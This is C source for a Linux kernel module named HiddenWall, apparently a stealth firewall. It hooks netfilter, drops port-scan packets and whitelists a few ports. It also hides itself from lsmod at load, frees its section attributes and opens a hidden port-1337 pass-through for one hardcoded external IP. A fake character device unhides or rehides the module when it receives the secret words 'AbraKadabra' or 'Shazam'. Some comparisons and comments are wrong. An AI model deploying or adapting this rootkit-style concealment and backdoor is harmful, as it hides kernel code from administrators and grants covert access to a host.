#include <linux/ip.h>
#include <linux/ipv6.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/icmpv6.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netfilter_ipv6.h>
#include <linux/skbuff.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/version.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>
#include <linux/inet.h>

static unsigned int major; /* major number for device */
static struct class *fake_class;
static struct cdev fake_cdev;
static char message[128];
//static struct nf_hook_ops netfilter_ops;

 
// Static IP: 192.168.0.1 aka localhost
static unsigned char *ip_address = "\x14\x00\x00\x03";

// external IP to liberate
static char *ip_externalv6 = "fe80::a5ab:c573:80dd:692b";
static char *ip_external = "192.168.100.181";
static struct list_head *module_previous;
static short module_hidden = 0;
int whitelist[]={53,80,443};



unsigned int filter_port_scans(struct sk_buff *skb)
{
	struct tcphdr *tcp_header=(struct tcphdr *) skb_transport_header(skb);

// NULL SCAN 
		if(	tcp_header->syn == 0 && tcp_header->ack == 0
			&& tcp_header->urg == 0 && tcp_header->rst == 0 
			&& tcp_header->fin == 0 && tcp_header->psh == 0)
			return NF_DROP;

// XMAS SCAN 
		if(	tcp_header->syn == 0 && tcp_header->ack == 0
			&& tcp_header->urg == 1 && tcp_header->rst == 0 
			&& tcp_header->fin == 1 && tcp_header->psh == 1)
			return NF_DROP;

// SYN SCAN 
		if(	tcp_header->syn == 1 && tcp_header->ack == 0
			&& tcp_header->urg == 0 && tcp_header->rst == 0 
			&& tcp_header->fin == 0 && tcp_header->psh == 0)
			return NF_DROP;

		if(	tcp_header->syn == 1 && tcp_header->ack == 1
			&& tcp_header->urg == 0 && tcp_header->rst == 0 
			&& tcp_header->fin == 0 && tcp_header->psh == 0)
			return NF_DROP;
// FIN SCAN
		if(	tcp_header->syn == 0 && tcp_header->ack == 0
			&& tcp_header->urg == 0 && tcp_header->rst == 0 
			&& tcp_header->fin == 1 && tcp_header->psh == 0)
			return NF_DROP;

		if(	tcp_header->syn == 0 && tcp_header->ack == 0
			&& tcp_header->urg == 1 && tcp_header->rst == 0 
			&& tcp_header->fin == 0 && tcp_header->psh == 1)
			return NF_DROP;
// ACK SCAN
		if(	tcp_header->syn == 0 && tcp_header->ack == 1
			&& tcp_header->urg == 0 && tcp_header->rst == 0 
			&& tcp_header->fin == 0 && tcp_header->psh == 0)
			return NF_DROP;


	return 55;
}

void module_hide(void)
{

	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

static inline void tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}


int fake_open(struct inode * inode, struct file * filp)
{
    return 0;
}


int fake_release(struct inode * inode, struct file * filp)
{
    return 0;
}


ssize_t fake_read (struct file *filp, char __user * buf, size_t count,
                                loff_t * offset)
{
    return 0;
}


ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
                                loff_t * offset)
{
	memset(message,0,127);

	if(copy_from_user(message,buf,127)!=0)
		return EFAULT;

/* if detect the secret string in device input, show module at lsmod. */
    	if(strstr(message,"AbraKadabra")!=NULL)
	{
		list_add(&THIS_MODULE->list, module_previous);
		module_hidden = 0;
     	}

/*	If detect Shazam string in fake device IO turn module invisible to lsmod  */
    	if(strstr(message,"Shazam")!=NULL)
	{
		module_hide();
     	}

    return count;
}


struct file_operations fake_fops = {
    open:       fake_open,
    release:    fake_release,
    read:       fake_read,
    write:      fake_write,
};


// TODO test IPV6
unsigned int test_icmp_v6(struct sk_buff *skb)
{	
	struct icmp6hdr *icmph;
//	struct ipv6hdr _iph;
	struct ipv6hdr *ip_hdr = (struct ipv6hdr *)skb_network_header(skb); //skb_header_pointer(skb, 0,sizeof(_iph),&_iph);
//	struct ipv6hdr *ip_hdr = ipv6_hdr(skb);
	icmph = icmp6_hdr(skb);

		if(!icmph) 
			return NF_ACCEPT; 

		if(ip_hdr->saddr.s6_addr == ip_address) 
			return NF_ACCEPT; 

		if(icmph->icmp6_type != ICMP_ECHOREPLY) 
			return NF_DROP; 

	return 55;
}


unsigned int test_icmp(struct sk_buff *skb)
{	
	struct icmphdr *icmph;
	struct iphdr *ip_hdr = (skb!=0)?(struct iphdr *)skb_network_header(skb):0;
	icmph = icmp_hdr(skb);

		if(!icmph) 
			return NF_ACCEPT; 

		if(ip_hdr->saddr == *(unsigned int*)ip_address) 
			return NF_ACCEPT; 

		if(icmph->type != ICMP_ECHOREPLY) 
			return NF_DROP; 

	return 55;
}





unsigned int test_udp(struct sk_buff *skb)
{
	int i=0;
	struct udphdr *udph=udp_hdr(skb);
	struct iphdr *ip_hdr = (skb!=0)?(struct iphdr *)skb_network_header(skb):0;
	unsigned int dest_port = (unsigned int)ntohs(udph->dest);
	unsigned int src_port = (unsigned int)ntohs(udph->source);

		if(!udph)
			return NF_ACCEPT; 
		// 	if(ip_hdr->daddr == *(unsigned int*)ip_address) return NF_ACCEPT; 

		if(ip_hdr->saddr == *(unsigned int*)ip_address) 
			return NF_ACCEPT; 

		while(i!=3)
		{
			if(dest_port == whitelist[i] || src_port == whitelist[i])
				return NF_ACCEPT; 
			i++;
		
		}

	return 55;
}

// TODO test IPV6
unsigned int test_udp_v6(struct sk_buff *skb)
{
	int i=0;
	
	struct udphdr *udph=udp_hdr(skb);
//	struct ipv6hdr _iph;
	struct ipv6hdr *ip_hdr = (struct ipv6hdr *)skb_network_header(skb); //skb_header_pointer(skb, 0,sizeof(_iph),&_iph);
	unsigned int dest_port = (unsigned int)ntohs(udph->dest);
	unsigned int src_port = (unsigned int)ntohs(udph->source);

		if(!udph)
			return NF_ACCEPT; 
	
//	inet6_ntoa(input_ip,(struct in6_addr *) ip_hdr->saddr.s6_addr);

//	snprintf(input_ip,33,"%pI6",&ip_hdr->saddr);

//		if(strstr(ip_v6_local,input_ip)==0) 
		if(ip_hdr->saddr.s6_addr==ip_address) 
			return NF_ACCEPT; 

		while(i!=3)
		{
			if(dest_port == whitelist[i] || src_port == whitelist[i])
				return NF_ACCEPT; 
			i++;
		
		}

	return 55;
		
}


unsigned int test_tcp(struct sk_buff *skb)
{
	int i=0;
	char daddr[16];
	char saddr[16];
	struct iphdr *ip_hdr = (skb!=0)?(struct iphdr *)skb_network_header(skb):0;
	struct tcphdr *tcph = tcp_hdr(skb);
	unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
	unsigned int src_port = (unsigned int)ntohs(tcph->source);

// TODO add memset() using nullbyte at template to daddr, saddr...

		if(!tcph)
			return NF_ACCEPT; 


		//	  	if(ip_hdr->daddr == *(unsigned int*)ip_address) return NF_ACCEPT; 
		if(ip_hdr->saddr == *(unsigned int*)ip_address)
			return NF_ACCEPT; 

	snprintf(saddr,16,"%pI4",&ip_hdr->saddr);
	snprintf(daddr,16,"%pI4",&ip_hdr->saddr);

		if((strncasecmp(saddr,ip_external,16)==0)||(strncasecmp(daddr,ip_external,16)==0))
			if(dest_port == 1337 || src_port == 1337)
				return NF_ACCEPT; 


		while(i!=3)
		{
			if(dest_port == whitelist[i] || src_port == whitelist[i]) 
				return NF_ACCEPT; 
			i++;
		}


	return filter_port_scans(skb);
}



// todo test IPV6 function
unsigned int test_tcp_v6(struct sk_buff *skb)
{
	int i=0;
	unsigned char saddr[64];
	unsigned char daddr[64];
//	struct ipv6hdr _iph;
	struct ipv6hdr *ip_hdr =  (struct ipv6hdr *)skb_network_header(skb);  //skb_header_pointer(skb, 0,sizeof(_iph),&_iph);
	struct tcphdr *tcph = tcp_hdr(skb);
	unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
	unsigned int src_port = (unsigned int)ntohs(tcph->source);
// todo add memset to set nullbyte at saddr and daddr...

		if(!tcph)
			return NF_ACCEPT; 


		//	  	if(ip_hdr->daddr.s6_addr == *(unsigned int*)ip_address) return NF_ACCEPT; 



//	in6_pton(ip_externalv6,-1,externals,-1,NULL);

	snprintf(saddr,64,"%pI6",&ip_hdr->saddr);
	snprintf(daddr,64,"%pI6",&ip_hdr->daddr);

	printk("TCP-LOG source: %s destiny %s \n",saddr,daddr);
	printk("TCP-LOG port source: %d  port destiny %d \n",src_port,dest_port);

//		if(strstr(saddr,ip_v6_local)==0) 
		if(ip_hdr->saddr.s6_addr==ip_address) 
			return NF_ACCEPT; 

		if((strstr(ip_externalv6,saddr)==0)||(strstr(ip_externalv6,daddr)==0))
			if(dest_port == 1337 || src_port == 1337)
				return NF_ACCEPT; 


		while(i!=3)
		{
			if(dest_port == whitelist[i] || src_port == whitelist[i]) 
				return NF_ACCEPT; 
			i++;
		}


	return filter_port_scans(skb);
}






// TODO test IPV6 func
unsigned int main_hook_v6( unsigned int hooknum, 
			struct sk_buff *skb, 
			const struct net_device *in, 
			const struct net_device *out, 
			int (*okfn)(struct sk_buff*))
{		
	struct ipv6hdr *ip_hdr = (struct ipv6hdr *)skb_network_header(skb);
	unsigned int res=55;

		if(!skb)
			return NF_ACCEPT; 

		if(!(ip_hdr))  
			return NF_ACCEPT; 

// TODO change to switch case here
		if(ip_hdr->nexthdr == IPPROTO_ICMPV6)
			res=test_icmp_v6(skb);

		if(res!=55)
			return res;	

		if(ip_hdr->nexthdr == IPPROTO_UDP)
			res=test_udp_v6(skb);

		if(res!=55)
			return res;

		if(ip_hdr->nexthdr == IPPROTO_TCP)
			res=test_tcp_v6(skb);

		if(res!=55)
			return res;

	return NF_DROP;
}



unsigned int main_hook_v4( unsigned int hooknum, 
			struct sk_buff *skb, 
			const struct net_device *in, 
			const struct net_device *out, 
			int (*okfn)(struct sk_buff*))
{		
	struct iphdr *ip_hdr = (skb!=0)?(struct iphdr *)skb_network_header(skb):0;
	unsigned int res=55;

		if(!skb)
			return NF_ACCEPT; 

		if(!(ip_hdr))  
			return NF_ACCEPT; 

// TODO add switch case here
		if(ip_hdr->protocol == IPPROTO_ICMP)
			res=test_icmp(skb);

		if(res!=55)
			return res;	

		if(ip_hdr->protocol == IPPROTO_UDP)
			res=test_udp(skb);

		if(res!=55)
			return res;

		if(ip_hdr->protocol == IPPROTO_TCP)
			res=test_tcp(skb);

		if(res!=55)
			return res;

	return NF_DROP;
}




static struct nf_hook_ops netfilter_ops __read_mostly	= {
	.pf 		= PF_INET,
	.priority	= NF_IP_PRI_FIRST,
	.hooknum	= NF_INET_PRE_ROUTING,
	.hook		= (nf_hookfn *)main_hook_v4,
};

// todo test ipv6
static struct nf_hook_ops netfilter_ops_v6 __read_mostly	= {
	.pf 		= PF_INET6,
	.priority	= NF_IP_PRI_FIRST,
	.hooknum	= NF_INET_PRE_ROUTING,
	.hook		= (nf_hookfn *)main_hook_v6,
};
 


int init_module()
{
    	struct device *fake_device;
    	int error;
    	dev_t devt = 0;

	module_hide();
	tidy();


    /* Get a range of minor numbers (starting with 0) to work with */
    	error = alloc_chrdev_region(&devt, 0, 1, "fake_char");

    	if (error < 0) 
	{
        	pr_err("Can't get major number\n");
        	return error;
    	}

    	major = MAJOR(devt);

    /* Create device class, visible in /sys/class */
    	fake_class = class_create(THIS_MODULE, "fake_char_class");

    	if (IS_ERR(fake_class)) {
        	unregister_chrdev_region(MKDEV(major, 0), 1);
        	return PTR_ERR(fake_class);
    	}

    /* Initialize the char device and tie a file_operations to it */
    	cdev_init(&fake_cdev, &fake_fops);
    	fake_cdev.owner = THIS_MODULE;
    /* Now make the device live for the users to access */
    	cdev_add(&fake_cdev, devt, 1);

    	fake_device = device_create(fake_class,
                                NULL,   /* no parent device */
                                devt,    /* associated dev_t */
                                NULL,   /* no additional data */
                                "fake_char");  /* device name */

    	if (IS_ERR(fake_device)) 
	{
        	class_destroy(fake_class);
        	unregister_chrdev_region(devt, 1);
        	return -1;
    	}


#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &netfilter_ops);	
	nf_register_net_hook(&init_net, &netfilter_ops_v6);
	
#else
	nf_register_hook(&netfilter_ops);
	nf_register_hook(&netfilter_ops_v6);
#endif
	return 0;
}

void cleanup_module() 
{ 
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_unregister_net_hook(&init_net, &netfilter_ops);
	nf_unregister_net_hook(&init_net, &netfilter_ops_v6);

#else
	nf_unregister_hook(&netfilter_ops);
	nf_unregister_hook(&netfilter_ops_v6);
#endif
	unregister_chrdev_region(MKDEV(major, 0), 1);
	device_destroy(fake_class, MKDEV(major, 0));
	cdev_del(&fake_cdev);
	class_destroy(fake_class);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CoolerVoid");
MODULE_DESCRIPTION("HiddenWall");
